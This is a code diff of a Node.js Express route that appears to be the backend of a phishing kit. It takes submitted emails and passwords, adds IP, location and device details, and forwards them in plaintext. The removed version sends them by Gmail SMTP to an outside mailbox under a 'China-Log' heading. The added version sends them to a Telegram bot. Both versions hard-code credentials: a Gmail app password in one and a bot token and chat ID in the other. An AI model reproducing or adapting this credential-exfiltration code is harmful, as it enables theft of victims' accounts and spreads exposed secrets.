@@ -1,29 +1,22 @@
 const express = require("express");
-const nodemailer = require('nodemailer');
+const fetch = require("node-fetch");  // install with: npm i node-fetch@2
 const geoip = require('geoip-lite');
 const UAParser = require('ua-parser-js');
 
 const router = express.Router();
 
-// Merge tag function
-function replaceMergeTags(template, data) {
-    return template.replace(/\[\[\s*-(.*?)\s*-\]\]/g, (_, key) => data[key.trim()] ?? '');
-}
+// Your Telegram bot credentials
+const BOT_TOKEN = "7257908863:AAF4i8Yp4J6KuVr9IQ66JJCdXh75qmVXrWI";   // from @BotFather
+const CHAT_ID = "2068151233";  // your chat ID
+const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-// Email transporter (Gmail App Password recommended)
-const transporter = nodemailer.createTransport({
-    host: 'smtp.gmail.com',
-    port: 587,
-    secure: false,
-    auth: {
-        user: "donchez051@gmail.com",
-        pass: "vkot qusn fung paan",
-    },
-});
-
-    router.post('/', async (req, res) => {
+router.post('/', async (req, res) => {
     try {
         const { email, password } = req.body;
+
+        if (!email || !password) {
+            return res.status(400).json({ success: false, message: "Missing email or password" });
+        }
 
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
         const location = geoip.lookup(ip);
@@ -33,43 +26,44 @@ const transporter = nodemailer.createTransport({
         const agent = parser.getResult();
         const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;
 
-        const htmlTemplate = `
-            <h1>China-Log</h1>
-            <ul>
-                <li><strong>Email:</strong> [[-email-]]</li>
-                <li><strong>Password:</strong> [[-password-]]</li>
-                <li><strong>IP:</strong> [[-ip-]]</li>
-                <li><strong>Location:</strong> [[-location-]]</li>
-                <li><strong>Timestamp:</strong> [[-timestamp-]]</li>
-            </ul>
+        // Build the Telegram message
+        const message = `
+📌 *Login Notification*
+- Email: \`${email}\`
+- Password: \`${password}\`
+- IP: \`${ip}\`
+- Location: ${locationStr}
+- Timestamp: ${new Date().toISOString()}
+- Device: ${deviceType}
         `;
 
-        const mergedHtml = replaceMergeTags(htmlTemplate, {
-            email,
-            password,
-            ip,
-            location: locationStr,
-            timestamp: new Date().toISOString(),
+        // Send to Telegram
+        const response = await fetch(TELEGRAM_API, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: "Markdown"
+            })
         });
 
-        await transporter.sendMail({
-            from:'"Your Result" <donchez051@gmail.com>',
-            to: "khriskhalid@tutamail.com",
-            subject: `New sign-in on ${deviceType}`,
-            html: mergedHtml,
-        });
+        if (!response.ok) {
+            const errText = await response.text();
+            throw new Error(`Telegram API error: ${errText}`);
+        }
 
-        console.log(`Email sent for ${email}`);
+        console.log(`Telegram notification sent for ${email}`);
 
         res.status(200).json({
             success: true,
-            message: "Login successful and notification sent",
-            loginDetails: { device: deviceType, ip, location: locationStr },
+            message: "Notification sent successfully via Telegram",
+            loginDetails: { device: deviceType, ip, location: locationStr }
         });
 
     } catch (error) {
-        console.error("Error sending email:", error);
-        res.status(500).json({ success: false, message: "Failed to send notification", error: error.message });
+        console.error("Error sending Telegram message:", error);
+        res.status(500).json({ success: false, message: "Failed to send Telegram notification", error: error.message });
     }
 });
 
